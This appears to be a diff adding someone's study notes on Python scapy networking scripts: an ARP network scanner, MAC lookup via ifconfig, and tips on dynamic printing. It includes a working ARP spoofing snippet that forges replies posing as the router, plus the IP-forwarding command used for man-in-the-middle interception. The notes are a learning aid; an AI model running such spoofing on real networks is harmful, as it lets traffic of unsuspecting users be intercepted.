@@ -1,0 +1,55 @@
+  arp_request_broadcast = broadcast/arp_request
+
+  This line creates a new packet by combining the ARP request packet and the Ethernet broadcast packet using the '/' operator. This creates a new packet with the ARP request packet as the payload and the Ethernet broadcast packet as the header.
+
+  answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+  
+This line sends the ARP request broadcast packet using the srp() function from the scapy module. This function sends packets at the link layer and returns a list of two lists: the first list contains packets that received a response, and the second list contains packets that did not receive a response. The timeout parameter is set to 1 second to limit the amount of time the function waits for a response, and the verbose parameter is set to False to suppress output. The [0] at the end of the line extracts the list of packets that received a response from the srp() function's return value.
+
+    for element in answered_list:
+        client_dict = {"ip":element[1].psrc,"mac":element[1].hwsrc}
+        clients_list.append(client_dict)
+
+This line loops through each packet in the answered_list list of packets that received a response from the srp() function. For each packet, it creates a dictionary called client_dict with two keys: "ip", which maps to the source IP address of the packet, and "mac", which maps to the source MAC address of the packet. It then appends this dictionary to the clients_list.
+
+
+ifconfig_result = subprocess.check_output(["ifconfig", interface]) 
+
+subprocess   .check_output() function is used to store the result in the ifconfig_result variable.
+
+        return mac_result.group(0)
+
+returns the exact first matchign group
+
+
+
+packet = scapy.ARP(op=2,pdst="target Ip addy", hwdst="target MAC addy", psrc="ROuter IP addy")
+scapy.send(packet)
+
+
+Routers Ip address remains the same but the MAC address is changed to attackers MAC. Since while using
+ARP it only tracks MAC the request now go to the attacker instead of the router.( this change only happens to 
+the system we are sending this packet to)
+
+
+# echo 1 > /proc/sys/net/ipv4/ip_forward
+
+Dynamic printing (python 2.7 and below)
+
+ print("[+] Packets sent: " + str(packet_count)),
+
+ this statement doesnt output anything the puts the outputs in a buffer
+ to flush the buffer (meaning when we end the program all of the outputs will be displayed at once)
+ we need to use
+
+ sys.stdout.flush() #this will flush the buffer 
+
+ Now every statement will be printed on the same line continously 
+
+ print("\r[+] Packets sent: " + str(packet_count)),
+
+ To make it print from the start and overwirte the previous output you can use \r
+
+Dynamic printing (python 3)
+ 
+ print("\r[+] Packets sent: " + str(packet_count), end="")
